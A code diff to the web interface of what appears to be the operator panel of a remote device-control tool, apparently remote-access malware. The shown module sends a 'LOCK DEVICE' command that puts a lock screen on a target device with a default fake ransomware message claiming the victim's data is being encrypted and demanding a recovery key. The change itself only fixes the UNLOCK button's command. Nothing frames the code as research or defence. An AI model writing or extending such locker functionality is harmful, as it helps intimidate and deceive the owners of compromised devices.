@@ -139,7 +139,7 @@
                                <textarea id="lmsg" style="background:#1a2525; border:1px solid #3b5e5e; padding:10px; border-radius:15px; color:#fff; width:100%; height:120px; resize:none;">SYSTEM CRITICAL ERROR\nYour data is being encrypted.\nPlease enter the recovery key.</textarea>
                                <p style="margin-top:15px; margin-bottom:5px; color:var(--dim)">Unlock PIN:</p>
                                <input id="lpin" value="1337" style="text-align:center; font-size:1.2rem; font-family:monospace;">`;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('toast off')">UNLOCK</button>`;
+                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('unlock')">UNLOCK</button>`;
             } else if(curMod === 'setwallpaper') {
                 b.innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Upload Wallpaper:</p>
                                <div style="background:#1a2525; padding:20px; border-radius:15px; border:2px dashed #3b5e5e; text-align:center; margin-bottom:15px;">
